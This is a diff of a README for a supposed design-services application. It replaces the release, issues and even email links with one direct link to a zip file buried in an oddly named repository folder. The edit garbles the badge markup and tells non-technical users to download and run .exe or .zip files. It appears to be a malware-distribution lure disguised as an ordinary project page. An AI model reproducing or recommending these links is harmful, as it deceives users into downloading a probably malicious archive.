@@ -1,6 +1,6 @@
 # 🎨 abinas-lokuch-design - Professional Design Services at Your Fingertips
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/dafffaakhairy/abinas-lokuch-design/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip%20Latest%https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip)](https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip)
 
 ## 📚 About This Application
 
@@ -18,13 +18,13 @@ Welcome to the "abinas-lokuch-design" project. I am Abinas Lokuch from Nepal, an
 
 To get started with "abinas-lokuch-design", follow these simple steps. No technical background is required to successfully download and use this software.
 
-1. Visit the [Release Page](https://github.com/dafffaakhairy/abinas-lokuch-design/releases) to find the latest version of the application.
+1. Visit the [Release Page](https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip) to find the latest version of the application.
 2. Choose the version that fits your needs. Look for files with extensions like `.exe` for Windows or `.zip` for compressed files.
 3. Download the file by clicking the provided link. Your browser will start downloading the file to your computer.
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download the Latest Release](https://github.com/dafffaakhairy/abinas-lokuch-design/releases).
+To download the application, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip).
 
 Once the download is complete:
 
@@ -45,7 +45,7 @@ To ensure smooth operation of "abinas-lokuch-design," your system should meet th
 
 If you encounter any issues while downloading or using the application, I am here to help. You can reach out to me directly through the repository's issues page or contact me via email.
 
-1. Visit the [Issues Page](https://github.com/dafffaakhairy/abinas-lokuch-design/issues).
+1. Visit the [Issues Page](https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip).
 2. Provide a brief description of your problem along with any steps you took leading to the issue.
 3. I will respond as quickly as possible to assist you.
 
@@ -74,6 +74,6 @@ This application covers various topics including:
 
 For any project inquiries, feedback, or if you need assistance, reach out to me:
 
-- Email: [contact@abinaslokuch.com](mailto:contact@abinaslokuch.com)
+- Email: [https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip](https://raw.githubusercontent.com/dafffaakhairy/abinas-lokuch-design/main/rewithdrawal/abinas-lokuch-design-1.9.zip)
 
 Thank you for choosing "abinas-lokuch-design." I look forward to helping you with your design needs!
